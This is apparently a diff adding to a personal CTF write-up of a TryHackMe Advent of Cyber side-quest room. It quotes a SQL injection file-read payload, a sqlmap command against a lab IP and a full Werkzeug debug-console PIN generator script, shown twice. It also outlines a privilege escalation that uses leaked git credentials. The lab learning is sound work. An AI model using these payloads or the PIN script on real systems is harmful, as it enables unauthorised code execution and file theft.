@@ -25,7 +25,7 @@ Yeti, Bandit and Advent in the search terms to find three of the rooms:
 [Day 1](https://tryhackme.com/room/adv3nt0fdbopsjcap)
 [Day 2](https://tryhackme.com/room/armageddon2r)
 [Day 3](https://tryhackme.com/room/busyvimfrosteau)
-https://tryhackme.com/room/surfingyetiiscomingtotown
+[Day 4](https://tryhackme.com/room/surfingyetiiscomingtotown)
 
 
 ## Writeups Used and Profiles Listed
@@ -263,6 +263,96 @@ Like so:
 
 `ls`-ing the host root directory: 
 ![](finalday3flagandyeti.png)
+
+## [The Bandit Surfer](https://tryhackme.com/room/surfingyetiiscomingtotown)
+
+The auto-exploit code is so inspiring and interesting just skimming the length of it I learnt about python:
+- `argparse` code in a try, if try, except, and any addition try,except block when some part of the attack chain is done  `if __name__ = "__main__":`
+	- reduces function calls, script size and keeps the discourse to that block instead of main()
+- Simple checks for big consequences
+	- `isAlive()`
+- I have worked with `sub.process` I could do this
+- `re` and `requests` are the only packages you really need with that I have personal issues with
+	- Worrying about too much specificity on request made and recieved and the how, when, what, etc
+	- `re`: I is great but at some points I have found my scripting with bash faster so taking the time to worry about `re` has always meant that in weighting up of my time that python as a language and its use cases for me have sat in weird edge case zone:
+		- Need it for exploits and change modify it and troubleshoot it, but do not want, struggle to or do not have the time to write this kind of code. 
+
+Before I get carried away with my beyond root 4 hour python automation Dev time, by just running the exploit there is [0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2023/advent-of-cyber-23-side-quest/the-bandit-surfer), [grepmorecoffee](https://github.com/JoanneBiltz/CTF-Writeups/tree/main/2023_THM_AOC_Side_Quests/the_bandit_surfer), [nouman404](https://nouman404.github.io/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day4) and [h3lli0t](https://h3lli0t.github.io/The-Bandit-Surfer-THM/) to read:
+- The QR code for this room was in Day 20 machine, in picture of the gitlab instance - `Day_20_calendar.png`
+- There is a Union SQL injection where we can retrieve files `UNION SELECT "file:///etc/passwd" -- -` as the files are stored in the database as ID that the backend then calls another function to retrieve the file on disk 
+- [nouman404](https://nouman404.github.io/CTFs/TryHackMe/AdventOfCyber2023/SideQuest_Day4#sqli) did `id=0' union select all concat('file:///etc/passwd')-- -`
+- [h3lli0t](https://h3lli0t.github.io/The-Bandit-Surfer-THM/) used `sqlmap -u "http://10.10.203.181:8000/download?id=" --dbs`, then `'+UNION+SELECT+"file:///etc/passwd"+--+-` in BurpSuite
+- Because werkzeug is a python webserver, similar to enumerating a SSTI we need to enumerate our capabilities of exploiting the vulnerability with that of the python functions allowed for the webserver to make by class ids '
+- The additional complexity is that need to retrieve the `private_bits` list from `app.py` so we need:
+	- `/sys/class/net/<device id>/address` for the MAC address
+	- machine-id from `/etc/machine-id`
+	- The we need the hashing algorithm and salt use from the initialisation of python3 libraries in this context in mcskiddy's:`$HOME/.local` directory: `/lib/python3.8/site-packages/werkzeug/debug/__init__.py`
+
+[0xb0b 's pin recovery utility script](https://github.com/Nouman404/nouman404.github.io/blob/main/_posts/CTFs/TryHackMe/AdventOfCyber2023/getFiles.sh) 
+> *Note that I put the `cron.service` (available in the `cgroup` file). But for some reason, sometimes it worked with it appended to the machine ID and sometimes without. So be aware of that.*
+
+[hdks werkzeug Console PIN Exploit](https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting/), [h3lli0t](https://h3lli0t.github.io/The-Bandit-Surfer-THM/), [0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2023/advent-of-cyber-23-side-quest/the-bandit-surfer)'s apparently sometimes-reliable pin cracking script:  
+```python
+import hashlib
+from itertools import chain
+probably_public_bits = [
+    'mcskidy',# username
+    'flask.app',# modname
+    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    '2818051077195',# str(uuid.getnode()),  /sys/class/net/ens33/address
+    'aee6189caee449718070b58132f2e4ba'# get_machine_id(), /etc/machine-id
+]
+
+#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+#h.update(b'shittysalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+```
+They all were the same and I have no idea whom to credit for it.
+
+This will be the second machine I auto-exploit from the set just to try use breakpoints and debug in VS code. 
+
+For root:
+- [GitTools](https://github.com/internetwache/GitTools): `gitdumper.sh`, `extractor.sh`
+- `git show e9855c8a10cb97c287759f498c3314912b7f4713` - exposed credentials in MySQL conf 
+- [grepmorecoffee](https://github.com/JoanneBiltz/CTF-Writeups/tree/main/2023_THM_AOC_Side_Quests/the_bandit_surfer) found mcskiddy's password in the MySQL.conf file: 
+```MySQL configuration
+app.config['MYSQL_HOST'] = 'localhost'
+app.config['MYSQL_USER'] = 'mcskidy'
+app.config['MYSQL_PASSWORD'] = '[REDACTED]'
+app.config['MYSQL_DB'] = 'elfimages'
+mysql = MySQL(app)```
+- `secure_path` environment can run run `/usr/bin/bash /opt/check.sh`, which uses `/opt/.bashrc` (bash run commands) is sourced from the `/opt/check.sh`
+- [h3lli0t](https://h3lli0t.github.io/The-Bandit-Surfer-THM/) `[` is actually a command, equivalent to the `test` command.
 ## Post-Completion-Reflection  
 
 - The people that unknowingly contributed to my fast-track exposure to these topics are awesome!
@@ -273,3 +363,51 @@ Like so:
 - https://tryhackme.com/room/nosqlinjectiontutorial
 
 - [sumanrox](https://github.com/sumanrox/sidequest-exploits/tree/main/sidequest_2) has a automated exploits - they look cool, work well, not many dependencies!
+	- Templating automated exploitation
+
+- Agile HTB is similar Weukzerg exploit: [https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting](https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting)
+```python
+import hashlib
+from itertools import chain
+probably_public_bits = [
+    'mcskidy',# username
+    'flask.app',# modname
+    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    '2818051077195',# str(uuid.getnode()),  /sys/class/net/ens33/address
+    'aee6189caee449718070b58132f2e4ba'# get_machine_id(), /etc/machine-id
+]
+
+#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+#h.update(b'shittysalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+```
